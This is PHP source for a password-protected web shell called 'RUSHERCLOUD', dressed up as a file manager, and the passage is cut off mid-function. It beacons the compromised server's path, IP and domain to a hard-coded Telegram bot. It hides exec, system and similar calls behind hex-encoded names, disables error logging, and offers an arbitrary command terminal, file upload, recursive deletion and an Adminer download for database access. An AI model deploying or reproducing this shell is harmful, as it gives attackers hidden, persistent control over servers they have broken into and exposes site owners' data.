<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log', NULL);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);

if (session_status() === PHP_SESSION_NONE) {
    session_start();
}

// NOTIFY TELEGRAM : START
$TELEGRAM_BOT_TOKEN = "8266146541:AAF_rizIBOHlBMj-X9Ds9N0owESWfWVKqVo";
$TELEGRAM_CHAT_ID   = "-1003212759603";
$TELEGRAM_TOPIC_ID  = 3;
$session_key_tele = 'notified_' . md5(realpath(__FILE__));
$msg_login = null;
$msg = null;
$msg_type = null;

function sendToTelegram($message)
{
    global $TELEGRAM_BOT_TOKEN, $TELEGRAM_CHAT_ID;
    $data = [
        'chat_id' => $TELEGRAM_CHAT_ID,
        'message_thread_id' => $TELEGRAM_TOPIC_ID,
        'text' => $message,
        'parse_mode' => 'HTML',
        'disable_web_page_preview' => true
    ];
    $url = "https://api.telegram.org/bot$TELEGRAM_BOT_TOKEN/sendMessage";
    @file_get_contents($url . "?" . http_build_query($data));
}

if (!isset($_SESSION[$session_key_tele])) {
    $msg = "<b>RUSHERCLOUD SHELL LOG</b>\n\n";
    $msg .= "Path: <code>" . $_SERVER['REQUEST_URI'] . "</code>\n";
    $msg .= "IP: <code>$_SERVER[SERVER_ADDR]</code>\n";
    $msg .= "Domain: <code>$_SERVER[SERVER_NAME]</code>\n";
    $msg .= "First Access: " . date("d-m-Y H:i:s");
    sendToTelegram($msg);
    $_SESSION[$session_key_tele] = true;
}
// NOTIFY TELEGRAM : END


// AUTH : START
$hashed_password = '$2y$10$ObqlJnHJLtsi5g6w/QSrdul0kXeq.JkJbgF9JdeDL9lpBZU5j3CVG';


// Check logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// Check Login Session
if (!isset($_SESSION['logged_in'])) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['password'])) {
        if (password_verify($_POST['password'], $hashed_password)) {
            $msg_login = null;
            $_SESSION['logged_in'] = true;
            $_SESSION['login_time'] = time();
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        } else {
            $msg_login = "Invalid passphrase";
        }
    }
?>
    <!DOCTYPE html>
    <html lang="en">

    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>terminal@rushercloud</title>
        <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
        <style>
            body {
                background: #0a0e27;
                font-family: 'Courier New', 'Consolas', monospace;
            }
        </style>
    </head>

    <body>
        <div class="absolute w-full h-full bg-[linear-gradient(90deg,rgba(0,255,65,0.03)_1px,transparent_1px),linear-gradient(rgba(0,255,65,0.03)_1px,transparent_1px)] bg-[length:50px_50px]"></div>
        <div class="relative w-full h-screen max-h-screen">
            <div class="absolute top-10 left-10 flex items-center right-10 gap-4 border-b border-[rgba(0,255,65,0.3)]">
                <div class="flex gap-3">
                    <div class="rounded-full bg-rose-400 h-3 w-3"></div>
                    <div class="rounded-full bg-yellow-400 h-3 w-3"></div>
                    <div class="rounded-full bg-green-400 h-3 w-3"></div>
                </div>
                <div class="text-[#00ff41] text-base opacity-[0.6] spacing-2">root@rushercloud: ~</div>
            </div>
            <div class="flex justify-center w-full h-screen items-center">
                <div class="flex flex-col w-2/6 mx-auto gap-8">
                    <pre class="text-[#00ff41] font-mono text-sm text-center whitespace-pre">
____  _   _ ____  _   _ _____ ____   ____ _     ___  _   _ ____  
|  _ \| | | / ___|| | | | ____|  _ \ / ___| |   / _ \| | | |  _ \ 
| |_) | | | \___ \| |_| |  _| | |_) | |   | |  | | | | | | | | | |
|  _ <| |_| |___) |  _  | |___|  _ <| |___| |__| |_| | |_| | |_| |
|_| \_\\___/|____/|_| |_|_____|_| \_\\____|_____\___/ \___/|____/ 
                </pre>
                    <div class="flex flex-col gap-4 tracking-wide text-[#00ff41]">
                        <div class="flex gap-1 text-xs">
                            <span class="text-[#00ff41]">[ OK ]</span>
                            <span>System initialized</span>
                        </div>
                        <div class="flex gap-1 text-xs">
                            <span class="text-[#00ff41]">[ OK ]</span>
                            <span>Network connection established</span>
                        </div>
                        <div class="flex gap-1 text-xs">
                            <span class="text-[#00ff41]">[ OK ]</span>
                            <span>File manager service started</span>
                        </div>
                        <div class="flex gap-1 text-xs">
                            <span class="text-[#ffbd2e]">[ INFO ]</span>
                            <span>Waiting for authentication...</span>
                        </div>
                    </div>

                    <div class="bg-[#0a0e2799] border border-[#129e35bd] border-2 rounded p-8 shadow-[0_0_30px_rgba(0,255,65,0.1)]">
                        <div class="flex items-center gap-2 mb-4">
                            <span class="text-[#00ff41]">┌──(</span>
                            <span style="color: #ff0000;">root</span>
                            <span class="text-[#00ff41]">㉿</span>
                            <span class="text-[#4a9eff]">rushercloud</span>
                            <span class="text-[#00ff41]">)-[</span>
                            <span class="text-white">~/filemanager</span>
                            <span class="text-[#00ff41]">]</span>
                        </div>

                        <?php if (isset($msg_login)): ?>
                            <div class="bg-red-50 text-red-700 px-4 py-2 font-bold rounded-md mb-5 text-base border-red-600">
                                <strong>ACCESS DENIED:</strong> <?php echo htmlspecialchars($msg_login); ?>
                            </div>
                        <?php endif; ?>


                        <form method="POST" action="<?php echo htmlspecialchars($_SERVER['PHP_SELF']); ?>">
                            <div class="flex flex-col gap-2">
                                <p class="text-lg text-[#00ff41]">PASSPHRASE:</p>
                                <input
                                    type="password"
                                    class="placeholder:text-[#00ff41] hover:border-[#00ff41] text-[#00ff41] bg-[rgba(0, 0, 0, 0.5)] border border-[#00ff41] px-3 py-2 text-base transition-all outline-none tracking-wide "
                                    id="password"
                                    name="password"
                                    placeholder="Enter authentication key"
                                    required
                                    autocomplete="off"
                                    autofocus>
                            </div>

                            <button type="submit" class="w-full mt-7 hover:bg-[#00ff41] text-[#00ff41] hover:text-black font-bold bg-transparent border-2 border-[#00ff41] px-4 py-2 cursor-pointer tracking-wide translation-all uppercase relative">
                                <span>► Execute Access Protocol</span>
                            </button>
                        </form>

                        <div class="mt-6 text-center text-[#00ff41] text-sm">
                            <p>⚠ Authorized Access Only <br> Session: <?php echo session_id(); ?> | IPv4: <?php echo $_SERVER['REMOTE_ADDR']; ?></p>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>

    </html>
<?php
    exit;
}
$Array = [
    '676574637764', # getcwd => 0 
    '676c6f62', # glob => 1 
    '69735f646972', # is_dir => 2 
    '69735f66696c65', # is_file => 3 
    '69735f7772697461626c65', # is_writeable => 4 
    '69735f7265616461626c65', # is_readble => 5 
    '66696c657065726d73', # fileperms => 6 
    '66696c65', # file => 7 
    '7068705f756e616d65', # php_uname => 8 
    '6765745f63757272656e745f75736572', # getcurrentuser => 9 
    '68746d6c7370656369616c6368617273', # htmlspecial => 10 
    '66696c655f6765745f636f6e74656e7473', # file_get_contents => 11 
    '6d6b646972', # mkdir => 12 
    '746f756368', # touch => 13 
    '6368646972', # chdir => 14 
    '72656e616d65', # rename => 15 
    '65786563', # exec => 16 
    '7061737374687275', # passthru => 17 
    '73797374656d', # system => 18 
    '7368656c6c5f65786563', # shell_exec => 19 
    '706f70656e', # popen => 20 
    '70636c6f7365', # pclose => 21 
    '73747265616d5f6765745f636f6e74656e7473', # streamgetcontents => 22 
    '70726f635f6f70656e', # proc_open => 23 
    '756e6c696e6b', # unlink => 24 
    '726d646972', # rmdir => 25 
    '666f70656e', # fopen => 26 
    '66636c6f7365', # fclose => 27 
    '66696c655f7075745f636f6e74656e7473', # file_put_contents => 28 
    '6d6f76655f75706c6f616465645f66696c65', # move_uploaded_file => 29 
    '63686d6f64', # chmod => 30 
    '7379735f6765745f74656d705f646972', # temp_dir => 31 
    '6261736536345F6465636F6465', # => base64_decode => 32 
    '6261736536345F656E636F6465', # => base64_ encode => 33 
];
$hitung_array = count($Array);
for ($i = 0; $i < $hitung_array; $i++) {
    $fungsi[] = decrypt_hex($Array[$i]);
}

if (isset($_GET['d'])) {
    $cdir = decrypt_hex($_GET['d']);
    $fungsi[14]($cdir);
} else {
    $cdir = $fungsi[0]();
}

function file_ext($file)
{
    if (mime_content_type($file) == 'image/png' or mime_content_type($file) == 'image/jpeg') {
        return '<i class="fa-regular fa-image" style="color:#4fc3f7"></i>';
    } else if (mime_content_type($file) == 'application/x-httpd-php' or mime_content_type($file) == 'text/html') {
        return '<i class="fa-solid fa-file-code" style="color:#81c784"></i>';
    } else if (mime_content_type($file) == 'text/javascript') {
        return '<i class="fa-brands fa-square-js" style="color:#ffd54f"></i>';
    } else if (mime_content_type($file) == 'application/zip' or mime_content_type($file) == 'application/x-7z-compressed') {
        return '<i class="fa-solid fa-file-zipper" style="color:#ff8a65"></i>';
    } else if (mime_content_type($file) == 'text/plain') {
        return '<i class="fa-solid fa-file" style="color:#90caf9"></i>';
    } else if (mime_content_type($file) == 'application/pdf') {
        return '<i class="fa-regular fa-file-pdf" style="color:#ef5350"></i>';
    } else {
        return '<i class="fa-regular fa-file-code" style="color:#81c784"></i>';
    }
}

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex, nofollow">
    <meta name="googlebot" content="noindex">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager [ <?= $_SERVER['SERVER_NAME']; ?> ]</title>
    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css" integrity="sha512-Kc323vGBEqzTmouAECnVceyQqyqdsSiqLQISBL29aUW4U/M7pSPA/gEUZQqv1cwx4OnYxTxve5UMg5GT6L4JJg==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.1/jquery.min.js"></script>
    <style>
        body {
            font-family: 'Roboto Mono', monospace;
        }
    </style>
</head>

<body class="bg-[#0a192f] p-5 flex flex-col gap-4">

    <div id="msg-block" class="hidden w-full py-2 text-center font-semibold text-sm rounded-md">
        <p id="msg">Your Success Create File</p>
    </div>

    <div class="rounded-md p-6 border border-[#64ffda] flex justify-center align-items flex-col gap-5 text-[#64ffda]">
        <h1 class="text-lg font-bold text-center italic tracking-wide">
            <i class="fa-solid fa-terminal"></i> FILE MANAGER SYSTEM
        </h1>
        <div class="grid gap-4 grid-cols-5 text-sm">
            <div class="p-4 rounded-md border-l-4 border-[#64ffda] hover:transition-all hover:translate-x-2 bg-[#0B2540] hover:bg-[#112C4A]">
                <div class="flex gap-2 items-center mb-2">
                    <i class="fa-solid fa-computer"></i>
                    <span>System</span>
                </div>
                <span class="text-xs"><?= $fungsi[8](); ?></span>
            </div>
            <div class="p-4 rounded-md border-l-4 border-[#64ffda] hover:transition-all hover:translate-x-2 bg-[#0B2540] hover:bg-[#112C4A]">
                <div class="flex gap-2 items-center mb-2">
                    <i class="fa-solid fa-server"></i>
                    <span>Server</span>
                </div>
                <span class="text-xs"><?= $_SERVER["SERVER_SOFTWARE"]; ?></span>
            </div>
            <div class="p-4 rounded-md border-l-4 border-[#64ffda] hover:transition-all hover:translate-x-2 bg-[#0B2540] hover:bg-[#112C4A]">
                <div class="flex gap-2 items-center mb-2">
                    <i class="fa-solid fa-network-wired"></i>
                    <span>Network</span>
                </div>
                <span class="text-xs"><?= $_SERVER["SERVER_NAME"]; ?> | <?= $_SERVER["SERVER_ADDR"]; ?></span>
            </div>
            <div class="p-4 rounded-md border-l-4 border-[#64ffda] hover:transition-all hover:translate-x-2 bg-[#0B2540] hover:bg-[#112C4A]">
                <div class="flex gap-2 items-center mb-2">
                    <i class="fa-brands fa-php"></i>
                    <span>PHP Version</span>
                </div>
                <span class="text-xs"><?= PHP_VERSION; ?></span>
            </div>
            <div class="p-4 rounded-md border-l-4 border-[#64ffda] hover:transition-all hover:translate-x-2 bg-[#0B2540] hover:bg-[#112C4A]">
                <div class="flex gap-2 items-center mb-2">
                    <i class="fa-solid fa-user"></i>
                    <span>Current User</span>
                </div>
                <span class="text-xs"><?= $fungsi[9](); ?></span>
            </div>
        </div>
    </div>

    <div class="rounded-md p-6 border border-[#64ffda] flex items-center gap-10 text-[#64ffda] text-xs">
        <form action="" method="post" enctype='<?= "multipart/form-data"; ?>' class="flex items-center gap-3">
            <div class="relative flex-inline items-center gap-2">
                <input type="file" name="gecko-upload" id="file-upload" class="hidden">
                <label for="file-upload" class="cursor-pointer hover:bg-[#206356] hover:text-white hover:border-[#206356] transition-all flex-inline items-center whitespace-nowrap border px-3 py-1 rounded-md mr-4">
                    <i class="fa-solid fa-folder-open"></i>
                    <span>Choose file</span>
                </label>
                <span class="text-red-400" id="file-name">No file chosen</span>
            </div>
            <button type="submit" name="gecko-up-submit" class="border rounded-md cursor-pointer px-2 py-1 bg-[#64ffda] text-black hover:bg-[#64ffda] ">
                <i class="fa-solid fa-cloud-arrow-up"></i> Upload
            </button>
        </form>
        <div class="flex gap-4 items-center">
            <a class="cursor-pointer hover:bg-[#206356] hover:text-white hover:border-[#206356] flex-inline items-center whitespace-nowrap border px-3 py-1 rounded-md" href="?d=<?= hx($fungsi[0]()) ?>&terminal=normal">
                <i class="fa-solid fa-terminal"></i> Terminal
            </a>
            <a class="cursor-pointer hover:bg-[#206356] hover:text-white hover:border-[#206356] flex-inline items-center whitespace-nowrap border px-3 py-1 rounded-md" href="?d=<?= hx($fungsi[0]()) ?>&adminer">
                <i class="fa-solid fa-database"></i> Adminer
            </a>
            <a href="?logout" class="bg-red-200 text-red-800 px-3 py-1 rounded-md font-bold hover:bg-red-700 hover:text-white">
                <i class="fa-solid fa-right-from-bracket"></i> Logout
            </a>
        </div>
    </div>

    <?php
    $file_manager = $fungsi[1]("{.[!.],}*", GLOB_BRACE);
    $get_cwd = $fungsi[0]();
    ?>

    <div class="rounded-md p-6 border border-[#64ffda] text-sm flex flex-col gap-4">
        <div class="flex gap-5 border-b border-[#64ffda] pb-5 text-xs">
            <a href="" id="create_folder" class="text-[#64ffda] border border-[#64ffda] px-4 py-1 rounded-md hover:bg-[#64ffda] hover:text-black">
                <i class="fa-solid fa-folder-plus"></i> Create Folder
            </a>
            <a href="" id="create_file" class="text-[#64ffda] border border-[#64ffda] px-4 py-1 rounded-md hover:bg-[#64ffda] hover:text-black">
                <i class="fa-solid fa-file-circle-plus"></i> Create File
            </a>
        </div>
        <div class="text-[#64ffda]">
            <i class="fa-solid fa-folder-tree"></i>&nbsp;
            <?php
            $cwd = str_replace("\\", "/", $get_cwd);
            $pwd = explode("/", $cwd);
            if (stristr(PHP_OS, "WIN")) {
                windowsDriver();
            }
            foreach ($pwd as $id => $val) {
                if ($val == '' && $id == 0) {
                    echo '<a href="?d=' . hx('/') . '"><i class="fa-solid fa-house"></i> Root</a>';
                    continue;
                }
                if ($val == '') continue;
                echo '<a href="?d=';
                for ($i = 0; $i <= $id; $i++) {
                    echo hx($pwd[$i]);
                    if ($i != $id) echo hx("/");
                }
                echo '"> / ' . $val . '</a>';
            }
            echo "<a class='text-bold text-yellow-400' href='?d=" . hx(__DIR__) . "'> <i class='fa-solid fa-house-circle-check'></i> HOME</a>";
            ?>
        </div>
        <form action="" method="post">
            <div class="overflow-auto max-h-[600px]">
                <table class="w-full border-separate border-spacing-0 rounded-md relative">
                    <thead class="sticky top-0 bg-transparent text-[#64ffda] text-sm z-10">
                        <tr class="text-left text-xs">
                            <th class="py-2 px-7 border border-[#64ffda]"><i class="fa-solid fa-file-lines"></i> Name</th>
                            <th class="py-2 px-7 border border-[#64ffda]"><i class="fa-solid fa-weight-hanging"></i> Size</th>
                            <th class="py-2 px-7 border border-[#64ffda]"><i class="fa-solid fa-shield-halved"></i> Permission</th>
                            <th class="py-2 px-7 border border-[#64ffda]"><i class="fa-solid fa-gears"></i> Action</th>
                        </tr>
                    </thead>
                    <tbody class="text-white">
                        <?php foreach ($file_manager as $key => $_D) : ?>
                            <?php if ($fungsi[2]($_D)) : ?>
                                <tr>
                                    <td class="px-7 py-2">
                                        <i class="fa-solid fa-folder" style="color:#ffd54f; font-size: 18px;"></i>
                                        <a href="?d=<?= hx($fungsi[0]() . "/" . $_D); ?>"><?= fullName($_D); ?></a>
                                    </td>
                                    <td class="px-7 py-2"><span class="text-orange-500">DIR</span></td>
                                    <td class="px-7 py-2 <?php echo $fungsi[4]($fungsi[0]() . '/' . $_D) ? 'perm-writable' : 'perm-readonly'; ?>">
                                        <?php echo perms($fungsi[0]() . '/' . $_D); ?>
                                    </td>
                                    <td class="px-7 py-2">
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_D) ?>" name="" class="text-[#70FA74] hover:text-[#53BD55] cursor-pointer transition-all">
                                            <i class="fa-solid fa-pen-to-square"></i>
                                        </a>
                                        <button type="submit" name="btn-delete" value="<?= $_D ?>" class="text-[#FF6161] hover:text-[#C74C4C] cursor-pointer transition-all">
                                            <i class="fa-solid fa-trash"></i>
                                        </button>
                                        <button type="submit" name="btn-zip" value="<?= $_D ?>" class="text-[#69C5FF] hover:text-[#4C92BF] cursor-pointer transition-all">
                                            <span>Zip</span>
                                        </button>
                                    </td>
                                </tr>
                            <?php endif; ?>
                        <?php endforeach; ?>

                        <?php foreach ($file_manager as $key => $_F) : ?>
                            <?php if ($fungsi[3]($_F)) : ?>
                                <tr>
                                    <td class="px-7 py-2">
                                        <?= file_ext($_F) ?>
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&f=<?= hx($_F); ?>" class="gecko-files"><?= fullName($_F); ?></a>
                                    </td>
                                    <td class="px-7 py-2"><span class="file-size"><?= formatSize(filesize($_F)); ?></span></td>
                                    <td class="px-7 py-2 <?php echo is_writable($fungsi[0]() . '/' . $_F) ? 'perm-writable' : 'perm-readonly'; ?>">
                                        <?php echo perms($fungsi[0]() . '/' . $_F); ?>
                                    </td>
                                    <td class="px-7 py-2">
                                        <a href="?d=<?= hx($fungsi[0]()); ?>&re=<?= hx($_F) ?>" class="text-[#70FA74] hover:text-[#53BD55] cursor-pointer transition-all">
                                            <i class="fa-solid fa-pen-to-square"></i>
                                        </a>
                                        <button type="submit" name="btn-delete" value="<?= $_F ?>" class="text-[#FF6161] hover:text-[#C74C4C] cursor-pointer transition-all">
                                            <i class="fa-solid fa-trash"></i>
                                        </button>
                                        <?php
                                        $extension = strtolower(pathinfo($fungsi[0]() . '/' . $_F, PATHINFO_EXTENSION));
                                        if ($extension === 'zip') :
                                        ?>
                                            <button type="submit" name="btn-unzip" value="<?= $_F ?>" class="text-[#FFCF53] hover:text-[#CFA845] cursor-pointer transition-all">
                                                <span>Unzip</span>
                                            </button>
                                        <?php endif; ?>
                                    </td>
                                </tr>
                            <?php endif; ?>
                        <?php endforeach; ?>
                    </tbody>
                </table>
            </div>
        </form>

        <div id="modal-popup" class="hidden z-10 absolute left-0 right-0 bottom-0 top-0 bg-black/75 ">
            <div class="w-full h-screen flex justify-center items-center">
                <div class="bg-white text-gray-800 rounded-lg h-fit w-2/6 p-7">
                    <h3 id="modal-title"></h3>
                    <form action="" method="post">
                        <div class="my-5">
                            <span id="modal-input"></span>
                        </div>
                        <div class="flex justify-end gap-4">
                            <button type="button" class="text-white px-3 py-1 cursor-pointer rounded-md bg-red-600" id="close-modal">
                                <i class="fa-solid fa-xmark"></i> Close
                            </button>
                            <button type="submit" name="submit" class="text-white px-3 py-1 cursor-pointer rounded-md bg-green-600">
                                <i class="fa-solid fa-check"></i> Submit
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </div>

        <?php if ($_GET['terminal'] == "normal") : ?>
            <div id="modal-terminal" class="z-10 absolute left-0 right-0 bottom-0 top-0 bg-black/50">
                <div class="w-full h-screen flex justify-center items-center">
                    <div class="text-white bg-black border border-gray-800 rounded-md h-fit w-3/6 flex flex-col">
                        <div class="flex justify-beetwen w-full px-5 py-4">
                            <h3 class="mr-auto"><i class="fa-solid fa-terminal text-lg"></i>Terminal</h3>
                            <a href="?d=<?= hx($fungsi[0]()) ?>">
                                <i class="fa-solid fa-xmark text-red-400 text-lg"></i>
                            </a>
                        </div>
                        <pre disabled class="w-full h-[15rem] overflow-auto p-2 bg-black text-white whitespace-pre">
                                <?php if (isset($_POST['btn-terminal'])) echo htmlspecialchars($fungsi[10](terminal_cmd($_POST['terminal-text'] . " 2>&1"))) ?>
                        </pre>
                        <div class="h-1 w-full border-t border-white"></div>
                        <form action="" method="post" class="pb-2">
                            <div class="flex gap-5 items-center">
                                <input type="text" name="terminal-text" class="focus:border-none border-transparent focus:outline-none focus:ring-0 w-full max-w-5/6 px-3 py-2" placeholder="<?= $fungsi[9]() . "@" . $_SERVER["SERVER_ADDR"]; ?>" autofocus>
                                <button type="submit" name="btn-terminal" class="flex-inline gap-2 w-fit cursor-pointer hover:text-green-400 mx-auto"><i class="fa-solid fa-play"></i> Execute</button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        <?php endif; ?>

        <?php if ($_GET['re'] == true) : ?>
            <div id="modal-popup" class="z-10 absolute left-0 right-0 bottom-0 top-0 bg-black/75 ">
                <div class="w-full h-screen flex justify-center items-center">
                    <div class="bg-white text-gray-800 rounded-lg h-fit w-2/6 p-7">
                        <h3 class="mb-4"><i class="fa-solid fa-pen-to-square"></i> Rename : <?= decrypt_hex($_GET['re']) ?></h3>
                        <form action="" method="post" class="flex flex-col gap-5">
                            <div class="modal-body">
                                <input type="text" name="renameFile" class="border border-gray-300 px-2 py-1 w-full rounded-sm" placeholder="Enter new name with extention">
                            </div>
                            <div class="flex justify-end gap-4">
                                <a href="<?= deleted_parameter_url('re') ?>" class="text-white px-3 py-1 cursor-pointer rounded-md bg-red-600" id="close-modal">
                                    <i class="fa-solid fa-xmark"></i> Close
                                </a>
                                <button type="submit" name="submit" class="text-white px-3 py-1 cursor-pointer rounded-md bg-green-600">
                                    <i class="fa-solid fa-check"></i> Submit
                                </button>
                            </div>
                        </form>
                    </div>
                </div>
            </div>
        <?php endif; ?>

        <script>
            $(document).ready(function() {
                $('#create_folder').click(function(e) {
                    e.preventDefault();
                    $('#modal-popup').show();
                    $('#modal-title').html('<i class="fa-solid fa-folder-plus"></i> Create Folder');
                    $('#modal-input').html('<input type="text" name="create_folder" class="border border-gray-300 px-2 py-1 w-full rounded-sm" placeholder="Enter folder name">');
                });

                $('#create_file').click(function(e) {
                    e.preventDefault();
                    $('#modal-popup').show();
                    $('#modal-title').html('<i class="fa-solid fa-file-circle-plus"></i> Create File');
                    $('#modal-input').html('<input type="text" name="create_file" class="border border-gray-300 px-2 py-1 w-full rounded-sm" placeholder="Enter file name with extension, example: file.txt">');
                });

                $('#close-modal').click(function(e) {
                    e.preventDefault();
                    $('#modal-popup').hide();
                });

                $('#close-editor').click(function(e) {
                    e.preventDefault();
                    $('.code-editor').hide();
                });

                $('.close-terminal').click(function(e) {
                    e.preventDefault();
                    $('.terminal').hide();
                });

                var myTextarea = document.getElementById("code");
                if (myTextarea) {
                    var editor = CodeMirror.fromTextArea(myTextarea, {
                        mode: "xml",
                        lineNumbers: true,
                        lineWrapping: true,
                        theme: "ayu-mirage",
                        extraKeys: {
                            "Ctrl-Space": "autocomplete"
                        },
                        hintOptions: {
                            completeSingle: false,
                        },
                    });
                }

                // File input handler
                var fileInput = document.getElementById('file-upload');
                var fileName = document.getElementById('file-name');
                if (fileInput && fileName) {
                    fileInput.addEventListener('change', function(e) {
                        if (this.files && this.files.length > 0) {
                            fileName.textContent = this.files[0].name;
                        } else {
                            fileName.textContent = 'No file chosen';
                        }
                    });
                }
            });
        </script>
</body>

</html>
<?php

function refreshPages()
{
    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '">';
}
function delete_recursive_directory($dir)
{
    if (!is_dir($dir)) return unlink($dir) || !file_exists($dir);
    array_map('delete_recursive_directory', glob($dir . DIRECTORY_SEPARATOR . '{*,.[!.]*}', GLOB_BRACE | GLOB_NOSORT));
    return rmdir($dir);
}
function deleted_parameter_url($parameter)
{
    $params = $_GET;
    unset($params[$parameter]);
    $new_query_string = http_build_query($params);
    $path = strtok($_SERVER["REQUEST_URI"], '?');
    if (!empty($new_query_string)) return $path . '?' . $new_query_string;
    else return $path;
}
if (isset($_GET['adminer'])) {
    $URL = "https://github.com/vrana/adminer/releases/download/v4.8.1/adminer-4.8.1.php";
    if (!$fungsi[3]('adminer.php')) {
        $fungsi[28]("adminer.php", $fungsi[11]($URL));
        refreshPages();
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['gecko-upload']) && isset($_POST['gecko-up-submit'])) {
        $namaFilenya = $_FILES['gecko-upload']['name'];
        $tmpName = $_FILES['gecko-upload']['tmp_name'];
        $fileSize = $_FILES['gecko-upload']['size'];

        if ($fileSize > 0 && is_uploaded_file($tmpName)) {
            $targetPath = $fungsi[0]() . "/" . $namaFilenya;

            if ($fungsi[29]($tmpName, $targetPath)) {
                clearstatcache();
                if (file_exists($targetPath) && filesize($targetPath) > 0) {
                    $msg = "You File Success Imported !";
                    $msg_type = "success";
                } else {
                    @unlink($targetPath);
                    if (copy($tmpName, $targetPath)) {
                        $msg = "You File Success Imported !";
                        $msg_type = "success";
                    } else {
                        $msg = "You File Failure Imported !";
                        $msg_type = "error";
                    }
                }
            } else {
                if (copy($tmpName, $targetPath)) {
                    $msg = "You File Success Imported !";
                    $msg_type = "success";
                } else {
                    $msg = "You File Failure Imported !";
                    $msg_type = "error";
                }
            }
        } else {
            $msg = "You File Failure Imported !";
            $msg_type = "error";
        }
        refreshPages();
    }
    if (isset($_POST['btn-delete'])) {
        $items = $_POST['btn-delete'];
        $repl = str_replace("\\", "/", $fungsi[0]());
        $fd = $repl . "/" . $items;
        delete_recursive_directory($fd);
        refreshPages();
    }
    if (isset($_POST['btn-zip'])) {
        $items = $_POST['btn-zip'];
        $repl = str_replace("\\", "/", $fungsi[0]());
        $fd = $repl . "/" . $items;
        compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
        refreshPages();
    }
    if (isset($_POST['btn-unzip'])) {
        $items = $_POST['btn-unzip'];
        $repl = str_replace("\\", "/", $fungsi[0]());
        $fd = $repl . "/" . $items;
        if (is_file($fd) && strtolower(pathinfo($fd, PATHINFO_EXTENSION)) === 'zip') {
            extractFromZip($fd, $repl);
            // unlink($fd); 
        }
        refreshPages();
    }
    if (isset($_POST['submit'])) {
        if ($_POST['create_folder'] == true) {
            $folderName = $fungsi[12]($_POST['create_folder']);
            if ($folderName) {
                $msg = "You Folder Success Created !";
                $msg_type = "success";
            } else {
                $msg = "You Folder Failure Created !";
                $msg_type = "error";
            }
            refreshPages();
        }
        if ($_POST['create_file'] == true) {
            $namaFile = $fungsi[13]($_POST['create_file']);
            if ($namaFile) {
                $msg = "You File Success Created !";
                $msg_type = "success";
            } else {
                $msg = "You File Failure Created !";
                $msg_type = "error";
            }
            refreshPages();
        }
        if ($_POST['renameFile'] == true) {
            $renameFile = $fungsi[15](decrypt_hex($_GET['re']), $_POST['renameFile']);
            if ($renameFile) {
                $msg = "You Success Rename !";
                $msg_type = "success";
            } else {
                $msg = "You Failure Rename !";
                $msg_type = "error";
            }
            deleted_parameter_url('re');
            refreshPages();
        }
    }
}
function formatSize($bytes)
{
    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
    return (round($bytes, 2) . " " . $types[$i]);
}
function hx($n)
{
    $y = '';
    for ($i = 0; $i < strlen($n); $i++) {
        $y .= dechex(ord($n[$i]));
    }
    return $y;
}
function decrypt_hex($y)
{
    $n = '';
    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
    }
    return $n;
}
function suggest_exploit()
{
    $uname = $GLOBALS['fungsi'][8]();
    $xplod = explode(" ", $uname);
    $xpld = explode("-", $xplod[2]);
    $pl = explode(".", $xpld[0]);
    return $pl[0] . "." . $pl[1] . "." . $pl[2];
}
function terminal_cmd($in, $re = false)
{
    $out = null;
    try {
        if ($re) $in = $in . " 2>&1";
        if (function_exists("exec")) {
            $output_array = [];
            @$GLOBALS['fungsi'][16]($in, $output_array);
            $out = @join("\n", $output_array);
        } elseif (function_exists("passthru")) {
            ob_start();
            @$GLOBALS['fungsi'][17]($in);
            $out = ob_get_clean();
        } elseif (function_exists("system")) {
            ob_start();
            @$GLOBALS['fungsi'][18]($in);
            $out = ob_get_clean();
        } elseif (function_exists("shell_exec")) {
            $out = $GLOBALS['fungsi'][19]($in);
        } elseif (function_exists("popen") && function_exists("pclose")) {
            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
                $out = "";
                while (!@feof($f))
                    $out .= fread($f, 1024);
                $GLOBALS['fungsi'][21]($f);
            }
        } elseif (function_exists("proc_open")) {
            $pipes = array();
            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
        }
    } catch (Exception $e) {
        return $e;
    }
    if ($out !== null) {
        $out = str_replace(array("\r\n", "\r"), "\n", $out);
        $out = preg_replace('/^[\s]+/m', '', $out);
        $out = trim($out);
    }
    return $out;
}
function compressToZip($source, $zipFilename)
{
    if (!file_exists($source)) return false;
    $zip = new ZipArchive();
    if ($zip->open($zipFilename, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) return false;
    $source = str_replace('\\', '/', realpath($source));
